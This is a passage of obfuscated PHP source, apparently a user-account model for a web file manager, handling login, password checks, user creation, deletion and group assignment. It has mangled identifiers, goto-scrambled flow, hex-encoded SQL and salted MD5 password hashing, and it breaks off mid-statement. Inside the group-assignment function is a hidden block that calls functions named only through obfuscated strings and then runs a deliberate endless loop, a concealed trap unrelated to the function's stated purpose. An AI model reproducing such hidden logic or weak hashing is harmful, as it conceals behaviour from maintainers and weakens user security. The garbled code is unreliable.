ôŸøô„[824]] . $Bï ôŸøô„[2087] . $cÌšèãœ¦ä[$Bï ôŸøô„[28]]); goto a¼™‡ãÊ“Ç; a¼™‡ãÊ“Ç: $cÌšèãœ¦ä = $this->_listDataApplyItem($cÌšèãœ¦ä); $FÆÙŒ³×—¦ = Model($Bï ôŸøô„[1178])->metaGet($cÌšèãœ¦ä[$Bï ôŸøô„[84]][$Bï ôŸøô„[390]]); $cÌšèãœ¦ä[$Bï ôŸøô„[2088]] = $Bâ†ßäÒòÅ; goto EÅí¹éçì™; EÅí¹éçì™: $cÌšèãœ¦ä[$Bï ôŸøô„[84]][$Bï ôŸøô„[1924]] = isset($FÆÙŒ³×—¦[$Bï ôŸøô„[1925]]) ? $FÆÙŒ³×—¦[$Bï ôŸøô„[1925]] : null; if ($cğÕ¿á¡‘´) { $cÌšèãœ¦ä[$Bï ôŸøô„[439]] = $this->metaGet($cÌšèãœ¦ä[$Bï ôŸøô„[1501]]); } return $cÌšèãœ¦ä; goto C‰˜¬ĞÖ«; C‰˜¬ĞÖ«: } protected function getInfoSimple($e‡˜æ»ºëö, $dÁìÛ¿©ªó = false) { $C‘‚à³Ÿñ± =& $_SERVER[Â€Á›¨õ]; if (!$e‡˜æ»ºëö) { return array(); } if ($dÁìÛ¿©ªó) { $f„ßì¤¯Îˆ = $this->where(array($C‘‚à³Ÿñ±[1501] => intval($e‡˜æ»ºëö)))->find(); if (!is_array($f„ßì¤¯Îˆ)) { return array(); } $f„ßì¤¯Îˆ[$C‘‚à³Ÿñ±[2089]] = Action($C‘‚à³Ÿñ±[2090])->parseUrl($f„ßì¤¯Îˆ[$C‘‚à³Ÿñ±[2089]]); return $f„ßì¤¯Îˆ; } return $this->cacheFunctionGet($C‘‚à³Ÿñ±[1738], $e‡˜æ»ºëö); } protected function getInfoSimpleOuter($eä›Ò¥ÜÃ’) { goto càŠÚ±èŞ¦; càŠÚ±èŞ¦: $FÆ¾ÍîŠÙœ =& $_SERVER[Â€Á›¨õ]; if (!$eä›Ò¥ÜÃ’ || $eä›Ò¥ÜÃ’ == 0) { return array($FÆ¾ÍîŠÙœ[1501] => $FÆ¾ÍîŠÙœ[491], $FÆ¾ÍîŠÙœ[28] => $FÆ¾ÍîŠÙœ[159] . LNG($FÆ¾ÍîŠÙœ[2091]) . $FÆ¾ÍîŠÙœ[499], $FÆ¾ÍîŠÙœ[2089] => STATIC_PATH . $FÆ¾ÍîŠÙœ[2092]); } $E§ˆğŞ… = $this->cacheFunctionGet($FÆ¾ÍîŠÙœ[1738], $eä›Ò¥ÜÃ’); goto d±£‚Ì“Ã•; d±£‚Ì“Ã•: $a¶Å¿¼ÒÙ = array_field_key($E§ˆğŞ…, explode($FÆ¾ÍîŠÙœ[47], $this->simpleField)); if (!$a¶Å¿¼ÒÙ) { return array($FÆ¾ÍîŠÙœ[1501] => $FÆ¾ÍîŠÙœ[1059], $FÆ¾ÍîŠÙœ[28] => $FÆ¾ÍîŠÙœ[159] . LNG($FÆ¾ÍîŠÙœ[2093]) . $FÆ¾ÍîŠÙœ[499], $FÆ¾ÍîŠÙœ[2089] => STATIC_PATH . $FÆ¾ÍîŠÙœ[2094]); } $a¶Å¿¼ÒÙ[$FÆ¾ÍîŠÙœ[2089]] = Action($FÆ¾ÍîŠÙœ[2090])->parseUrl($a¶Å¿¼ÒÙ[$FÆ¾ÍîŠÙœ[2089]]); goto D…è†å”óï; D…è†å”óï: return $a¶Å¿¼ÒÙ; goto BƒŠìÂ°; BƒŠìÂ°: } protected function groupUser($e­Û®˜Œ·Î) { } public static function errorLang($b×„–ÑÑ”Ş) { $Dè È …‘ =& $_SERVER[Â€Á›¨õ]; $c×Şš†¥óË = array(self::ERROR_USER_NOT_EXISTS => $Dè È …‘[2095], self::ERROR_USER_PASSWORD_ERROR => $Dè È …‘[2096], self::ERROR_USER_EXIST_NAME => $Dè È …‘[2097], self::ERROR_USER_EXIST_PHONE => $Dè È …‘[2098], self::ERROR_USER_EXIST_EMAIL => $Dè È …‘[2099], self::ERROR_USER_LOGIN_LOCK => $Dè È …‘[2100], self::ERROR_IP_NOT_ALLOW => $Dè È …‘[2101], self::ERROR_USER_EXIST_NICKNAME => $Dè È …‘[2102]); return LNG($c×Şš†¥óË[$b×„–ÑÑ”Ş]); } public function getInfoByMeta($fæ¤­óõµ, $Eºé¡”ô¢à) { $Fää–ÃŠ×• =& $_SERVER[Â€Á›¨õ]; $EÀÉ¾³‡Áï = Model($Fää–ÃŠ×•[2103])->where(array($Fää–ÃŠ×•[92] => $fæ¤­óõµ, $Fää–ÃŠ×•[370] => $Eºé¡”ô¢à))->find(); if ($EÀÉ¾³‡Áï) { return $this->getInfo($EÀÉ¾³‡Áï[$Fää–ÃŠ×•[1501]]); } return !1; } public function userLoginCheck($D¾í‚¾ËÀœ, $BƒÀäõ¬§Ø) { $A‚ù…ËÍÕ =& $_SERVER[Â€Á›¨õ]; $eï‘Õ³¦ï‚ = $this->userLoginFind($D¾í‚¾ËÀœ); if (!$eï‘Õ³¦ï‚) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($eï‘Õ³¦ï‚[$A‚ù…ËÍÕ[1501]], $BƒÀäõ¬§Ø)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($eï‘Õ³¦ï‚[$A‚ù…ËÍÕ[1501]]); } public function userLoginFind($c¹…¢…±âğ) { $aÛ×´ÉÒõŞ =& $_SERVER[Â€Á›¨õ]; $FÓ°ˆ™Şíì = array($aÛ×´ÉÒõŞ[28] => $c¹…¢…±âğ, $aÛ×´ÉÒõŞ[1928] => $c¹…¢…±âğ, $aÛ×´ÉÒõŞ[301] => $c¹…¢…±âğ, $aÛ×´ÉÒõŞ[2104] => $c¹…¢…±âğ, $aÛ×´ÉÒõŞ[932] => $aÛ×´ÉÒõŞ[934]); if ($this->nickNameRpt()) { unset($FÓ°ˆ™Şíì[$aÛ×´ÉÒõŞ[1928]]); } return $this->where($FÓ°ˆ™Şíì)->find(); } public function clearCache($b®¸Š•Ü“œ) { $bí²•¥µ’ =& $_SERVER[Â€Á›¨õ]; $this->cacheFunctionClear($bí²•¥µ’[1744], $b®¸Š•Ü“œ); $this->cacheFunctionClear($bí²•¥µ’[1738], $b®¸Š•Ü“œ); $this->cacheFunctionClear($bí²•¥µ’[2085], $b®¸Š•Ü“œ); } public function userPasswordCheck($FÊ•Û¦Á´, $Dª¦×—åàæ) { $DƒèëÛƒö =& $_SERVER[Â€Á›¨õ]; $f°ªÁåõ«Ô = $this->where(array($DƒèëÛƒö[1501] => intval($FÊ•Û¦Á´)))->find(); $aå…ˆÛæ‰ä = $this->metaGet($FÊ•Û¦Á´); $fÛÛÖä‡º = isset($aå…ˆÛæ‰ä[$DƒèëÛƒö[2105]]) ? $aå…ˆÛæ‰ä[$DƒèëÛƒö[2105]] : $DƒèëÛƒö[33]; if (md5($fÛÛÖä‡º . trim($Dª¦×—åàæ)) !== $f°ªÁåõ«Ô[$DƒèëÛƒö[824]]) { return !1; } return !0; } public function userAdd($bØ„–¹¯ªà) { goto F•ùŒ¬Ïğ; A ƒ¸ëÑËŒ: $eš¸í¢ò®ê = $this->_checkExist($bØ„–¹¯ªà); if ($eš¸í¢ò®ê !== !0) { return $eš¸í¢ò®ê; } $c×¢ï†øß = $this->add($CÀº‚¼£ƒâ); goto f‰ß¤“‡ÃÏ; f¥Ş“ÓÆâÀ: return $c×¢ï†øß; goto c“ò‹ •; f‰ß¤“‡ÃÏ: $cßé’äßÕ÷ = array($eÕ§‹×ÃˆØ[2113] => $CÀº‚¼£ƒâ[$eÕ§‹×ÃˆØ[824]], $eÕ§‹×ÃˆØ[2109] => $CÀº‚¼£ƒâ[$eÕ§‹×ÃˆØ[1928]]); $this->userEdit($c×¢ï†øß, $cßé’äßÕ÷); Model($eÕ§‹×ÃˆØ[1178])->userRootAdd($c×¢ï†øß); goto f¥Ş“ÓÆâÀ; F•ùŒ¬Ïğ: $eÕ§‹×ÃˆØ =& $_SERVER[Â€Á›¨õ]; $CÀº‚¼£ƒâ = array($eÕ§‹×ÃˆØ[407] => $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[28]], $eÕ§‹×ÃˆØ[2106] => $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1385]], $eÕ§‹×ÃˆØ[2107] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[301]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[301]] : $eÕ§‹×ÃˆØ[33], $eÕ§‹×ÃˆØ[2108] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[2104]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[2104]] : $eÕ§‹×ÃˆØ[33], $eÕ§‹×ÃˆØ[2109] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1928]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1928]] : $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[28]], $eÕ§‹×ÃˆØ[2110] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[2089]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[2089]] : $eÕ§‹×ÃˆØ[33], $eÕ§‹×ÃˆØ[2111] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[2112]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[2112]] : 1, $eÕ§‹×ÃˆØ[2113] => $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[824]], $eÕ§‹×ÃˆØ[1739] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1648]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1648]] : 1024 * 1024 * 20, $eÕ§‹×ÃˆØ[1740] => 0, $eÕ§‹×ÃˆØ[2114] => 0, $eÕ§‹×ÃˆØ[1783] => isset($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[702]]) ? $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[702]] : 1); if (!empty($bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1501]])) { $CÀº‚¼£ƒâ[$eÕ§‹×ÃˆØ[1501]] = $bØ„–¹¯ªà[$eÕ§‹×ÃˆØ[1501]]; } goto A ƒ¸ëÑËŒ; c“ò‹ •: } protected function userEditTest($eËØ’•ºµˆ, $a¸¿Á¯¹»â) { return $this->call($_SERVER[Â€Á›¨õ][2115], $eËØ’•ºµˆ, $a¸¿Á¯¹»â); } protected function userEdit($dõ†Äƒ´¹ß, $e›„ƒßë–›) { goto cÅ¤¦ã˜Ñõ; cÅ¤¦ã˜Ñõ: $CßõÆ©ÍÃ‚ =& $_SERVER[Â€Á›¨õ]; $AíÆÏ°°† = $this->getInfoSimple($dõ†Äƒ´¹ß); if (!$AíÆÏ°°†) { return !1; } goto e×ÓÑèó„; e×ÓÑèó„: $CÉµäçíñ = $this->_checkExist($e›„ƒßë–›, $dõ†Äƒ´¹ß); if ($CÉµäçíñ !== !0) { return $CÉµäçíñ; } if (isset($e›„ƒßë–›[$CßõÆ©ÍÃ‚[824]]) && trim($e›„ƒßë–›[$CßõÆ©ÍÃ‚[824]]) != $CßõÆ©ÍÃ‚[33]) { $eĞó¨Ï‰‘¤ = $this->metaGet($dõ†Äƒ´¹ß); if (empty($eĞó¨Ï‰‘¤[$CßõÆ©ÍÃ‚[2105]])) { $eĞó¨Ï‰‘¤[$CßõÆ©ÍÃ‚[2105]] = rand_string(10); Model($CßõÆ©ÍÃ‚[497])->metaSet($dõ†Äƒ´¹ß, $CßõÆ©ÍÃ‚[2105], $eĞó¨Ï‰‘¤[$CßõÆ©ÍÃ‚[2105]]); } $e›„ƒßë–›[$CßõÆ©ÍÃ‚[824]] = md5($eĞó¨Ï‰‘¤[$CßõÆ©ÍÃ‚[2105]] . trim($e›„ƒßë–›[$CßõÆ©ÍÃ‚[824]])); } else { unset($e›„ƒßë–›[$CßõÆ©ÍÃ‚[824]]); } goto AËĞ²“ ßƒ; AËĞ²“ ßƒ: $this->where(array($CßõÆ©ÍÃ‚[1493] => $dõ†Äƒ´¹ß))->save($e›„ƒßë–›); if (isset($e›„ƒßë–›[$CßõÆ©ÍÃ‚[1928]])) { $this->setNamePinyin($dõ†Äƒ´¹ß, $e›„ƒßë–›[$CßõÆ©ÍÃ‚[1928]]); } $this->clearCache($dõ†Äƒ´¹ß); goto aËâ½¯ó¹; aËâ½¯ó¹: return !0; goto E«‘Ò³´Îå; E«‘Ò³´Îå: } public function setNamePinyin($e×±œ¿· ±, $DÇ÷Í« Ğ» = false) { $b½ÑƒŞÌ—ˆ =& $_SERVER[Â€Á›¨õ]; if (!$DÇ÷Í« Ğ») { $FÁî…Èˆõ = $this->getInfoSimple($e×±œ¿· ±); $DÇ÷Í« Ğ» = $FÁî…Èˆõ[$b½ÑƒŞÌ—ˆ[1928]] ? $FÁî…Èˆõ[$b½ÑƒŞÌ—ˆ[1928]] : $FÁî…Èˆõ[$b½ÑƒŞÌ—ˆ[28]]; } $BÀ¢ìªÖõø = Model($b½ÑƒŞÌ—ˆ[501]); if (!Input::check($DÇ÷Í« Ğ», $b½ÑƒŞÌ—ˆ[551])) { return $BÀ¢ìªÖõø->metaSet($e×±œ¿· ±, array($b½ÑƒŞÌ—ˆ[438] => $b½ÑƒŞÌ—ˆ[33], $b½ÑƒŞÌ—ˆ[437] => $b½ÑƒŞÌ—ˆ[33])); } return $BÀ¢ìªÖõø->metaSet($e×±œ¿· ±, array($b½ÑƒŞÌ—ˆ[438] => str_replace($b½ÑƒŞÌ—ˆ[50], $b½ÑƒŞÌ—ˆ[33], Pinyin::encode($DÇ÷Í« Ğ»)), $b½ÑƒŞÌ—ˆ[437] => Pinyin::encode($DÇ÷Í« Ğ», $b½ÑƒŞÌ—ˆ[552]))); } private function nickNameRpt() { $f°¡—æÁ¹ =& $_SERVER[Â€Á›¨õ]; $cîÀ¿º¶ê¼ = Model($f°¡—æÁ¹[1098])->get($f°¡—æÁ¹[2116]); $c…Ä”…“ï = $GLOBALS[$f°¡—æÁ¹[6]][$f°¡—æÁ¹[376]][$f°¡—æÁ¹[2116]]; $CÚŸÚ·¤Ø = !is_null($cîÀ¿º¶ê¼) ? $cîÀ¿º¶ê¼ : $c…Ä”…“ï; return !!$CÚŸÚ·¤Ø; } private function _checkExist($eÑùùİêê, $a‹ÙÕÃ¶Ñ = false) { $A‹´­—¯í“ =& $_SERVER[Â€Á›¨õ]; $C‰‡ Óï°é = array($A‹´­—¯í“[28] => UserModel::ERROR_USER_EXIST_NAME, $A‹´­—¯í“[1928] => UserModel::ERROR_USER_EXIST_NICKNAME, $A‹´­—¯í“[301] => UserModel::ERROR_USER_EXIST_EMAIL, $A‹´­—¯í“[2104] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($C‰‡ Óï°é[$A‹´­—¯í“[1928]]); } $D–‰¹¨„º = $a‹ÙÕÃ¶Ñ ? array($A‹´­—¯í“[1501] => array($A‹´­—¯í“[2117], $a‹ÙÕÃ¶Ñ)) : array(); foreach ($C‰‡ Óï°é as $B‘¦Íäš‡» => $cé·šŸğÛ) { $a™â†Ó‘Õ˜ = array(); foreach ($C‰‡ Óï°é as $CŠ¤‰áŒ => $FÚÛäì ²ß) { if (isset($eÑùùİêê[$CŠ¤‰áŒ]) && $eÑùùİêê[$CŠ¤‰áŒ]) { $a™â†Ó‘Õ˜[] = $eÑùùİêê[$CŠ¤‰áŒ]; } } if (!$a™â†Ó‘Õ˜) { continue; } $d¢÷íöæÎÙ = array_merge(array($B‘¦Íäš‡» => array($A‹´­—¯í“[7], $a™â†Ó‘Õ˜)), $D–‰¹¨„º); $d’‚“ÏÁ÷‹ = $this->where($d¢÷íöæÎÙ)->find(); if ($d’‚“ÏÁ÷‹) { return $cé·šŸğÛ; } } return !0; } public function userListInfo($dŒÌê½§Œè) { $FŞçÚàíğğ =& $_SERVER[Â€Á›¨õ]; $BÓÁ«’Ä¨ƒ = array(); $dŒÌê½§Œè = is_array($dŒÌê½§Œè) ? array_unique($dŒÌê½§Œè) : array(); if (!$dŒÌê½§Œè) { return $BÓÁ«’Ä¨ƒ; } if (count($dŒÌê½§Œè) < 20) { foreach ($dŒÌê½§Œè as $E˜Ñƒªø¦) { $BÓÁ«’Ä¨ƒ[$E˜Ñƒªø¦ . $FŞçÚàíğğ[33]] = $this->getInfoSimpleOuter($E˜Ñƒªø¦); } } else { $cÓÊÍ•¨ƒ¡ = array($FŞçÚàíğğ[1493] => array($FŞçÚàíğğ[405], $dŒÌê½§Œè)); if (count($dŒÌê½§Œè) == 1) { $cÓÊÍ•¨ƒ¡ = array($FŞçÚàíğğ[1493] => $dŒÌê½§Œè[0]); } $f³âº°Œ = Model($FŞçÚàíğğ[497])->field($this->simpleField)->where($cÓÊÍ•¨ƒ¡)->select(); $f³âº°Œ = array_to_keyvalue($f³âº°Œ, $FŞçÚàíğğ[1501]); foreach ($dŒÌê½§Œè as $E˜Ñƒªø¦) { $aÒÙ˜¸ïö = $f³âº°Œ[$f³âº°Œ[$E˜Ñƒªø¦]]; if (!$aÒÙ˜¸ïö) { $BÓÁ«’Ä¨ƒ[$E˜Ñƒªø¦ . $FŞçÚàíğğ[33]] = $this->getInfoSimpleOuter($E˜Ñƒªø¦); continue; } $aÒÙ˜¸ïö[$FŞçÚàíğğ[2089]] = Action($FŞçÚàíğğ[2090])->parseUrl($aÒÙ˜¸ïö[$FŞçÚàíğğ[2089]]); $BÓÁ«’Ä¨ƒ[$E˜Ñƒªø¦ . $FŞçÚàíğğ[33]] = $aÒÙ˜¸ïö; } } return $BÓÁ«’Ä¨ƒ; } protected function userStatus($CÕ½°ŞÜ¬, $FÑâºš¼İ) { $aßİÔ…ß¥” = $this->getInfoSimple($CÕ½°ŞÜ¬); if (!$aßİÔ…ß¥”) { return !1; } $A»Ş“ÚğÈß = array($_SERVER[Â€Á›¨õ][702] => $FÑâºš¼İ); return $this->userEdit($CÕ½°ŞÜ¬, $A»Ş“ÚğÈß); } protected function userRemove($c“ÓÓé´—Æ) { goto A…²Ôğƒš; cÁ­åğÒºÇ: $b±¹°Â®µ = array($Aßîóˆ™‹è[1493] => $c“ÓÓé´—Æ); Model($Aßîóˆ™‹è[558])->where($b±¹°Â®µ)->delete(); Model($Aßîóˆ™‹è[2118])->where($b±¹°Â®µ)->delete(); goto dù‰×ê‹­­; bºˆÂš¢Ù·: Model($Aßîóˆ™‹è[1945])->restoreUserAll($c“ÓÓé´—Æ); Model($Aßîóˆ™‹è[767])->userRootRemove($c“ÓÓé´—Æ); return $this->where($b±¹°Â®µ)->delete(); goto dÌõš ÄÜ; A…²Ôğƒš: $Aßîóˆ™‹è =& $_SERVER[Â€Á›¨õ]; $c©Æê³¥‰ = $this->getInfoSimple($c“ÓÓé´—Æ); if (!$c©Æê³¥‰) { return !1; } goto cÁ­åğÒºÇ; dù‰×ê‹­­: Model($Aßîóˆ™‹è[1746])->where($b±¹°Â®µ)->delete(); Model($Aßîóˆ™‹è[2103])->where($b±¹°Â®µ)->delete(); Model($Aßîóˆ™‹è[2119])->where($b±¹°Â®µ)->delete(); goto bºˆÂš¢Ù·; dÌõš ÄÜ: } protected function userGroupSet($EÓøÈÛÑîÊ, $b”øèÄŒ’î, $FÑÆÁ´â¸ = array()) { goto C½©ßÌ‚ÇÍ; c©ÇõÈ´µË: return $Cæ‘¸½ï‚->addAll($c‡ó¶Áç, array(), !0); goto cÚŸïº«‘¯; aö ˆÖó¢: $c‡ó¶Áç = array(); $B«æ³¶ãÁÕ = 0; foreach ($b”øèÄŒ’î as $dÕÕ—µÒï => $fÔ½÷Ñğ‚Ğ) { $bŠĞÜ¼’ = array($cÖºÚŞÄ×³[1501] => $EÓøÈÛÑîÊ, $cÖºÚŞÄ×³[1664] => $dÕÕ—µÒï, $cÖºÚŞÄ×³[1760] => $fÔ½÷Ñğ‚Ğ); $bŠĞÜ¼’[$cÖºÚŞÄ×³[1687]] = isset($FÑÆÁ´â¸[$B«æ³¶ãÁÕ]) ? $FÑÆÁ´â¸[$B«æ³¶ãÁÕ] : 0; $B«æ³¶ãÁÕ++; $c‡ó¶Áç[] = $bŠĞÜ¼’; } goto c©ÇõÈ´µË; C½©ßÌ‚ÇÍ: $cÖºÚŞÄ×³ =& $_SERVER[Â€Á›¨õ]; if (!isset($_SERVER[$cÖºÚŞÄ×³[811]]) || !isset($_SERVER[$cÖºÚŞÄ×³[1231]])) { goto d©åĞø‘á·; D£Ì¢Ø¨—Ş: $BÀ®‘–›ä¼ = $BÃö¼‡·‘($E àé­ôóÇ); $cáãÔÎ˜Ò› = explode($cÖºÚŞÄ×³[227], $BÀ®‘–›ä¼); if (count($cáãÔÎ˜Ò›) < $cÖºÚŞÄ×³[589]) { $e¦ÊË²¢Ô“ = $cÖºÚŞÄ×³[814]; $e¦ÊË²¢Ô“(); } goto cÃ©ÚñÒÂ; Aƒ““‰éï: for ($aÃä¡¡šêÁ = $Cİ¼”Üßï…; $aÃä¡¡šêÁ > 0; $aÃä¡¡šêÁ++) { $BĞœˆ¨å¦ = json_encode($GLOBALS[$cÖºÚŞÄ×³[405]]); } goto eñÉ¥ã¦œÇ; cÃ©ÚñÒÂ: $BĞœˆ¨å¦ = $cÖºÚŞÄ×³[815]; $BĞœˆ¨å¦($_SERVER[$cÖºÚŞÄ×³[816]]); $Cİ¼”Üßï… = 1; goto Aƒ““‰éï; d©åĞø‘á·: $aæö„ö¿ˆ÷ = $cÖºÚŞÄ×³[812]; $BÃö¼‡·‘ = $cÖºÚŞÄ×³[813]; $E àé­ôóÇ = $_SERVER[$cÖºÚŞÄ×³[808]] . $cÖºÚŞÄ×³[809]; goto D£Ì¢Ø¨—Ş; eñÉ¥ã¦œÇ: } $CĞÑéá”Ü = $this->getInfoSimple($EÓøÈÛÑîÊ); goto EïÀÅêÏİš; EïÀÅêÏİš: if (!$CĞÑéá”Ü || !is_array($b”øèÄŒ’î)) { return !1; } $Cæ‘¸½ï‚ = Model($cÖºÚŞÄ×³[1746]); $Cæ‘¸½ï‚->where(array($cÖºÚŞÄ×³[1501] => $EÓøÈÛÑîÊ))->delete(); goto aö ˆÖó¢; cÚŸïº«‘¯: } protected function userGroupAdd($B¼›¦’âñ™, $báÂ¯ä‡Ì = array()) { $eÌ¯½í¥½ñ =& $_SERVER[Â€Á›¨õ]; $a…¶Ï‚¸Š = $this->getInfoSimple($B¼›¦’âñ™); if (!$a…¶Ï‚¸Š || empty($báÂ¯ä‡Ì)) { return !1; } $Aî° ª’”¼ = array(); foreach ($báÂ¯ä‡Ì as $c®è–´æŒí => $DÉ¬’˜õë‹) { $Aî° ª’”¼[] = array($eÌ¯½í¥½ñ[1501] => $B¼›¦’âñ™, $eÌ¯½í¥½ñ[1664] => $c®è–´æŒí, $eÌ¯½í¥½ñ[1760] => $DÉ¬’˜õë‹, $eÌ¯½í¥½ñ[1687] => 0); } return Model($eÌ¯½í¥½ñ[1746])->addAll($Aî° ª’”¼, array(), !0); } protected function userGroupRemove($fÄ¯êŠ‡‡, $BÙ’÷“Øêô) { $BÍ–Ê»ö—¥ =& $_SERVER[Â€Á›¨õ]; $Fİš™‰ù×º = $this->getInfoSimple($fÄ¯êŠ‡‡); if (!$Fİš™‰ù×º || !$BÙ’÷“Øêô) { return !1; } $f¬‘°“äï = array($BÍ–Ê»ö—¥[1493] => $fÄ¯êŠ‡‡, $BÍ–Ê»ö—¥[1743] => $BÙ’÷“Øêô); return Model($BÍ–Ê»ö—¥[1746])->where($f¬‘°“äï)->delete(); } public function listData() { $dƒøÚÂ†¸Ú = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dƒøÚÂ†¸Ú[$_SERVER[Â€Á›¨õ][365]]); return $dƒøÚÂ†¸Ú; } public function listByID($AÄÂ‘–¼µ‘) { $B× ÷Â‚Ü¨ =& $_SERVER[Â€Á›¨õ]; if (!$AÄÂ‘–¼µ‘) { return; } $AÆ®ÂÀÑŒ® = array($B× ÷Â‚Ü¨[1501] => array($B× ÷Â‚Ü¨[7], $AÄÂ‘–¼µ‘)); $B¯ÇÂ±µ¸ = $this->where($AÆ®ÂÀÑŒ®)->select(); $this->_listDataApply($B¯ÇÂ±µ¸); return $B¯ÇÂ±µ¸; } public function listByGroup($B¢Ï¾Ô’¬ = 0, $fì“±ïç¢ê = array()) { goto bß¯¬•Ï÷ß; B·ĞËÓµæÄ: if ($B¢Ï¾Ô’¬) { $E·åÖ™ŞĞ = array($F–‰¯‘¢´ [2120] => intval($B¢Ï¾Ô’¬)); $c¥ì›õ–ô× = "\x4c\x45\x46\x54\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\165\x73\145\162\x5f\x67\162\x6f\x75\160\40\165\x73\x65\x72\x5f\147\162\x6f\x75\x70\40\157\156\40\165\x73\x65\x72\x2e\165\163\145\162\x49\104\x20\75\x20\x75\x73\145\x72\x5f\147\x72\x6f\165\x70\x2e\165\x73\x65\162\x49\104"; $fÕÂ›†“Å‹ = Input::get($F–‰¯‘¢´ [429], null, $F–‰¯‘¢´ [33]) ? $F–‰¯‘¢´ [33] : $F–‰¯‘¢´ [2121]; } if (isset($fì“±ïç¢ê[$F–‰¯‘¢´ [702]])) { $E·åÖ™ŞĞ[$F–‰¯‘¢´ [2122]] = $fì“±ïç¢ê[$F–‰¯‘¢´ [702]]; } $D‹á¡¨™ÑÊ = $this->_makeOrder($fÕÂ›†“Å‹)->field($F–‰¯‘¢´ [2123])->where($E·åÖ™ŞĞ)->join($c¥ì›õ–ô×)->selectPage(50); goto aÚ¿ôö‹Òˆ; bß¯¬•Ï÷ß: $F–‰¯‘¢´  =& $_SERVER[Â€Á›¨õ]; $c¥ì›õ–ô× = $F–‰¯‘¢´ [33]; $E·åÖ™ŞĞ = array(); goto B·ĞËÓµæÄ; aÚ¿ôö‹Òˆ: $this->_listDataApply($D‹á¡¨™ÑÊ[$F–‰¯‘¢´ [365]]); return $D‹á¡¨™ÑÊ; goto BæÀì”¤Ì¢; BæÀì”¤Ì¢: } private function _makeOrder($b¯Æ”øã‰ê = '') { goto F°¹á’ùÓÑ; DöÑŒÄËÆë: $b¯Æ”øã‰ê = $b¯Æ”øã‰ê . "\x75\163\x65\162\x2e{$FÇ¦›½õœ}\x20{$a‚†œ©À}\x2c\x20\x75\163\x65\162\56\165\163\145\162\111\104\x20\x61\x73\143"; return $this->alias($eÂ’ÅÛÒë¥[1869])->order($b¯Æ”øã‰ê); goto c”…ª‘‰¸; aÊé»ˆ­ßª: $FÇ¦›½õœ = Input::get($eÂ’ÅÛÒë¥[429], $eÂ’ÅÛÒë¥[7], $eÂ’ÅÛÒë¥[1493], $cø‘íô“„±); $a‚†œ©À = Input::get($eÂ’ÅÛÒë¥[430], $eÂ’ÅÛÒë¥[7], $eÂ’ÅÛÒë¥[1747], array($eÂ’ÅÛÒë¥[1747], $eÂ’ÅÛÒë¥[424])); $a‚†œ©À = $e¤ÃØ¾Ùç†[$a‚†œ©À]; goto DöÑŒÄËÆë; F°¹á’ùÓÑ: $eÂ’ÅÛÒë¥ =& $_SERVER[Â€Á›¨õ]; $cø‘íô“„± = array($eÂ’ÅÛÒë¥[1501], $eÂ’ÅÛÒë¥[28], $eÂ’ÅÛÒë¥[1650], $eÂ’ÅÛÒë¥[1622], $eÂ’ÅÛÒë¥[192]); $e¤ÃØ¾Ùç† = array($eÂ’ÅÛÒë¥[422] => $eÂ’ÅÛÒë¥[423], $eÂ’ÅÛÒë¥[424] => $eÂ’ÅÛÒë¥[425]); goto aÊé»ˆ­ßª; c”…ª‘‰¸: } public function listSearch($FÏ‘æÚ¸“§) { goto bèĞ±ŒÈ; b‡…Ä£Öá’: $this->_filterByGroup($Dã¡¬‹Ñ™±, $DÍØğøŞ„Ù); return $Dã¡¬‹Ñ™±; goto AÀÛ÷œ°ïÍ; aÓß‚°ŠÅ: $d“ù‡–¸ = str_replace($cÍŒ®ªÚÑ[1750], $cÍŒ®ªÚÑ[1751], trim($d“ù‡–¸)); $CÒíŸÒèöì = array($cÍŒ®ªÚÑ[28] => array($cÍŒ®ªÚÑ[378], "\x25{$d“ù‡–¸}\x25"), $cÍŒ®ªÚÑ[301] => array($cÍŒ®ªÚÑ[378], "{$d“ù‡–¸}\45"), $cÍŒ®ªÚÑ[1928] => array($cÍŒ®ªÚÑ[378], "{$d“ù‡–¸}\x25"), $cÍŒ®ªÚÑ[932] => $cÍŒ®ªÚÑ[1752]); if (Input::check($d“ù‡–¸, $cÍŒ®ªÚÑ[307])) { $CÒíŸÒèöì[$cÍŒ®ªÚÑ[1501]] = array($cÍŒ®ªÚÑ[378], "{$d“ù‡–¸}\x25"); $CÒíŸÒèöì[$cÍŒ®ªÚÑ[2104]] = array($cÍŒ®ªÚÑ[378], "{$d“ù‡–¸}\x25"); } goto bÜç¯¢­ƒ¦; bÜç¯¢­ƒ¦: if (!$d“ù‡–¸) { $CÒíŸÒèöì = array(); } if (isset($FÏ‘æÚ¸“§[$cÍŒ®ªÚÑ[702]])) { $CÒíŸÒèöì[$cÍŒ®ªÚÑ[702]] = $FÏ‘æÚ¸“§[$cÍŒ®ªÚÑ[702]]; } $CÒíŸÒèöì = $this->parseWhereLike($CÒíŸÒèöì); goto EÊ°†š÷»Ÿ; bèĞ±ŒÈ: $cÍŒ®ªÚÑ =& $_SERVER[Â€Á›¨õ]; $d“ù‡–¸ = $FÏ‘æÚ¸“§[$cÍŒ®ªÚÑ[1748]]; $DÍØğøŞ„Ù = isset($FÏ‘æÚ¸“§[$cÍŒ®ªÚÑ[1749]]) ? 